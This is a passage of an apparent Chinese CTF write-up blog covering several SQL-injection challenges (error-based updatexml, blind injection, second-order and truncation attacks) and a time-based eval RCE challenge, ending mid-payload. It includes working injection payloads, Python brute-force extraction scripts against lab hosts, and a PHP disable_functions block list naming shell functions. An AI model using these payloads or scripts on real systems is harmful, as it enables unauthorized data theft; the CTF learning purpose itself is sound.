class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">'~RCTF&#123;Good job! But flag not her'</span></span><br></pre></td></tr></table></figure><p>看来这个flag是假的，那么得在别的表里找找，发现在users</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'users'</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">'~name,pwd,email,real_flag_1s_her'</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_her))<span class="keyword">from</span>(<span class="keyword">users</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//<span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">'real_flag_1s_her'</span> <span class="keyword">in</span> <span class="string">'field list'</span></span><br></pre></td></tr></table></figure><p>可以看到应该是列没有完全输出，用regexp匹配吧</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x3a,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'users'</span>)&amp;&amp;(column_name)regexp(<span class="string">'^r'</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//XPATH syntax <span class="keyword">error</span>: <span class="string">':real_flag_1s_here'</span></span><br></pre></td></tr></table></figure><p>最后面读取flag有个坑，就是长度有限制，用reverse倒序输出即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin"^updatexml(1,concat(0x3a,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_here))<span class="keyword">from</span>(<span class="keyword">users</span>)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">'^f'</span>))),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"><span class="keyword">admin</span><span class="string">"^updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1)#</span></span><br></pre></td></tr></table></figure><h3 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h3><p>知识点：information_schema库被禁止访问后，可以用<strong>sys.schema_auto_increment_columns</strong>、<strong>schema_table_statistics_with_buffer</strong>、<strong>x$schema_table_statistics_with_buffer</strong></p><p>fuzz：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤and or等关键字</span><br><span class="line">不能用information_schema，过滤了sys.schema_auto_increment_columns </span><br><span class="line">没有单独过滤union和select, 但是过滤了union select</span><br><span class="line">过滤join</span><br></pre></td></tr></table></figure><p>经过测试查询正常时会返回NU1L</p><p>上盲注脚本（这个是Ying师傅的脚本<a href="https://www.gem-love.com/ctf/1669.html）后面的字符ASCII偏移一位原理讲解就在这里面：" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1669.html）后面的字符ASCII偏移一位原理讲解就在这里面：</a></p><p>自己写的二分法跑不出来，不知道为什么233333，就用Ying师傅的吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">alphabet = [<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'_'</span>,<span class="string">','</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'j'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'g'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'G'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">url = <span class="string">'http://8b008f3e-4320-4795-870b-4f489a316096.node3.buuoj.cn/index.php'</span></span><br><span class="line">target = <span class="string">'select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line">        payload = <span class="string">'2||ascii(substr((&#123;&#125;),&#123;&#125;,1))=\'&#123;&#125;\''</span>.format(target, i, ord(char))</span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += char</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#users23333333333333,f1ag_1s_h3r3_hhhhh</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://8b008f3e-4320-4795-870b-4f489a316096.node3.buuoj.cn/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span><span class="params">(flag)</span>:</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += hex(ord(i))</span><br><span class="line">    res = <span class="string">'0x'</span> + res.replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    hexchar = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">        hexchar = trans(flag+ chr(char))</span><br><span class="line">        payload = <span class="string">'2||((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))'</span>.format(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(char<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">核心payload：(<span class="keyword">select</span> <span class="string">'admin'</span>,<span class="string">'admin'</span>)&gt;(<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>)</span><br><span class="line">MySQL遇到<span class="keyword">hex</span>会自动转成字符串</span><br></pre></td></tr></table></figure><h3 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h3><p>登录注册，注册是有一个用户名，但是登录却没有用到，登录成功之后显示了用户名，也就是说注册的时候写入了数据库，之后再次拿出显示出来，应该存在二次注入。注册成功会302状态码跳转，失败返回200状态码</p><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0'%2B(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">hex</span>(<span class="keyword">hex</span>((<span class="keyword">select</span> * <span class="keyword">from</span> flag))) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">10</span>))%<span class="number">2</span>B<span class="string">'0</span></span><br></pre></td></tr></table></figure><p>为什么payload是这样的，看一下本地测试</p><img src="/2020/05/30/SQLChallenge/3.png" class=""><p>只经过hex一次的数据会显示不全，加上0是为了完全显示，之后，发现加0的查找会只显示字母之前的数字，后面的全部被截断了，所以用两次hex，这里有数据精度的问题，科学计数法数据显示不全，这就要用到substr来几位几位查找，下面的是一个其他师傅的脚本，可以直接用，有时间了再自己写写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line">ch = string.ascii_lowercase+string.digits+<span class="string">'-&#125;'</span>+<span class="string">'&#123;'</span></span><br><span class="line"></span><br><span class="line">re = requests.session()</span><br><span class="line">url = <span class="string">'http://be50c81b-e823-4784-8255-cb37e1378c8c.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(email,username)</span>:</span></span><br><span class="line">    url1 = url+<span class="string">'register.php'</span></span><br><span class="line">    data = dict(email = email, username = username,password = <span class="string">'adsl1234'</span>)</span><br><span class="line">    html = re.post(url1,data=data)</span><br><span class="line">    html.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(email)</span>:</span></span><br><span class="line">    url2 = url+<span class="string">'login.php'</span></span><br><span class="line">    data = dict(email = email,password = <span class="string">'adsl1234'</span>)</span><br><span class="line">    html = re.post(url2, data=data)</span><br><span class="line">    html.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">    payload = <span class="string">"0'^(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))^'0"</span>.format(int(j)*<span class="number">10</span>+<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line">    email = <span class="string">'&#123;&#125;@qq.com'</span>.format(str(j)+<span class="string">'14'</span>)</span><br><span class="line">    html = register(email,payload)</span><br><span class="line">    <span class="comment"># print html.text</span></span><br><span class="line">    html = login(email)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = r.findall(<span class="string">r'&lt;span class="user-name"&gt;(.*?)&lt;/span&gt;'</span>,html.text,r.S)</span><br><span class="line">        flag = res[<span class="number">0</span>][<span class="number">1</span>:].strip()</span><br><span class="line">        print(flag)</span><br><span class="line">        f += flag</span><br><span class="line">        print(f)</span><br><span class="line">        print(f.decode(<span class="string">'hex'</span>).decode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"problem"</span>)</span><br></pre></td></tr></table></figure><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>二次注入，注入点应该在username</p><p>尝试一下</p><p>注册<code>username=admin&#39; or 1=1#&amp;passwd=123</code> </p><img src="/2020/05/30/SQLChallenge/4.png" class=""><p>可以看到有回显，fuzz好像没有过滤什么，常规union注入即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1' union <span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">' union select group_concat(table_name) from information_schema.tables where table_schema='</span>ctftraining<span class="string">'#  FLAG_TABLE,news,users</span></span><br><span class="line"><span class="string">-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'FLAG_TABLE'</span><span class="comment">#FLAG_COLUMN/id,username,password,info,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span></span><br><span class="line"><span class="number">-1</span><span class="string">' union select 1,2,group_concat(FLAG_COLUMN) from FLAG_TABLE#</span></span><br></pre></td></tr></table></figure><p>有点问题，flag爆不出，方法知道就行了，不纠结了，做下一题去</p><h2 id="FBCTF2019-Products-Manager"><a href="#FBCTF2019-Products-Manager" class="headerlink" title="[FBCTF2019]Products Manager"></a>[FBCTF2019]Products Manager</h2><img src="/2020/05/30/SQLChallenge/5.png" class=""><p>有三个按钮可以操作，可以添加可以看，题目给了源码附件，扒下来看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE products (</span></span><br><span class="line"><span class="comment">  name char(64),</span></span><br><span class="line"><span class="comment">  secret char(64),</span></span><br><span class="line"><span class="comment">  description varchar(250)</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('messenger', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('instagram', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('whatsapp', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('oculus-rift', sha256(....), ....);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>可以看到flag在名为facebook的用户这里，name值长度为64字节</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_secret</span><span class="params">($secret)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (strlen($secret) &lt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里添加用户还需要添加密钥，长度要大于10位</p><p>重点：数据库的另一个特性，当设计一个字段时，我们都必须对其设定一个最大长度，比如CHAR(10)，VARCHAR(20)等等。但是当实际插入数据的长度超过限制时，数据库就会将其进行截断，只保留限定的长度。</p><p>所以可以添加fackbook的账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">账户：facebook空格</span><br><span class="line"></span><br><span class="line">密码：Fbctf @ fb10</span><br><span class="line"></span><br><span class="line">描述：FLAG_HERE</span><br></pre></td></tr></table></figure><p>添加成功后查看信息，就能看到flag了</p><img src="/2020/05/30/SQLChallenge/6.png" class=""><h2 id="RCTF2019-calcalcalc"><a href="#RCTF2019-calcalcalc" class="headerlink" title="[RCTF2019]calcalcalc"></a>[RCTF2019]calcalcalc</h2><p>一个计算器，直接看源码</p><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate</span><span class="params">()</span>:</span></span><br><span class="line">    data = request.get_data()</span><br><span class="line">    expr = bson.BSON(data).decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'exec'</span> <span class="keyword">in</span> dir(__builtins__):</span><br><span class="line">        <span class="keyword">del</span> __builtins__.<span class="keyword">exec</span></span><br><span class="line">    <span class="keyword">return</span> bson.BSON.encode(&#123;</span><br><span class="line">        <span class="string">"ret"</span>: str(eval(str(expr[<span class="string">'expression'</span>])))</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">"0.0.0.0"</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line">$input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$options = MongoDB\BSON\toPHP($input);</span><br><span class="line">$ret = <span class="keyword">eval</span>(<span class="string">'return '</span> . (string) $options-&gt;expression . <span class="string">';'</span>);</span><br><span class="line"><span class="keyword">echo</span> MongoDB\BSON\fromPHP([<span class="string">'ret'</span> =&gt; (string) $ret]);</span><br></pre></td></tr></table></figure><p>WAF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disable_functions = set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log</span><br><span class="line">max_execution_time = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>nodejs</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bson = <span class="built_in">require</span>(<span class="string">'bson'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> cluster = <span class="built_in">require</span>(<span class="string">'cluster'</span>)</span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cluster.isMaster) &#123;</span><br><span class="line">  app.use(bodyParser.raw(&#123; <span class="attr">inflate</span>: <span class="literal">true</span>, <span class="attr">limit</span>: <span class="string">'10kb'</span>, <span class="attr">type</span>: <span class="string">'*/*'</span> &#125;))</span><br><span class="line"></span><br><span class="line">  app.post(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> body = req.body</span><br><span class="line">    <span class="keyword">const</span> data = bson.deserialize(Buffer.from(body))</span><br><span class="line">    <span class="keyword">const</span> worker = cluster.fork()</span><br><span class="line">    worker.send(data.expression.toString())</span><br><span class="line">    worker.on(<span class="string">'message'</span>, (ret) =&gt; &#123;</span><br><span class="line">      res.write(bson.serialize(&#123; <span class="attr">ret</span>: ret.toString() &#125;))</span><br><span class="line">      res.end()</span><br><span class="line">    &#125;)</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!worker.isDead()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          worker.kill()</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!res._headerSent) &#123;</span><br><span class="line">        res.write(bson.serialize(&#123; <span class="attr">ret</span>: <span class="string">'timeout'</span> &#125;))</span><br><span class="line">        res.end()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  app.listen(<span class="number">80</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Server created'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">  (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> Module = <span class="built_in">require</span>(<span class="string">'module'</span>)</span><br><span class="line">    <span class="keyword">const</span> _require = Module.prototype.require</span><br><span class="line">    Module.prototype.require = <span class="function">(<span class="params">arg</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> ([<span class="string">'os'</span>, <span class="string">'child_process'</span>, <span class="string">'vm'</span>, <span class="string">'cluster'</span>].includes(arg)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> _require.call(_require, arg)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)()</span><br><span class="line"></span><br><span class="line">  process.on(<span class="string">'message'</span>, msg =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> ret = <span class="built_in">eval</span>(msg)</span><br><span class="line">    process.send(ret)</span><br><span class="line">    process.exit(<span class="number">0</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三个后端同时对输入得式子进行计算，如果结果相等就输出生效</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">validate(value: any, <span class="attr">args</span>: ValidationArguments) &#123;</span><br><span class="line">    <span class="keyword">const</span> str = value ? value.toString() : <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (str.length === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!(args.object <span class="keyword">as</span> CalculateModel).isVip) &#123;</span><br><span class="line">        <span class="keyword">if</span> (str.length &gt;= args.constraints[<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^[0-9a-z\[\]\(\)\+\-\*\/ \t]+$/i</span>.test(str)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对输入的正则匹配过滤</p><p>每一个后端都是直接进行eval，并没有预执行，或者放在sandbox中执行，那如果我们的恶意参数输入，确实是先执行后，才比对结果，看不到回显，数据外带不行，因为三个后端都在内网中</p><p>下面的东西都在这篇文章里<a href="https://skysec.top/2017/12/29/Time-Based-RCE/" target="_blank" rel="noopener">https://skysec.top/2017/12/29/Time-Based-RCE/</a></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#39;time&#39;).sleep(5) if &#123;boolean_exp&#125; else 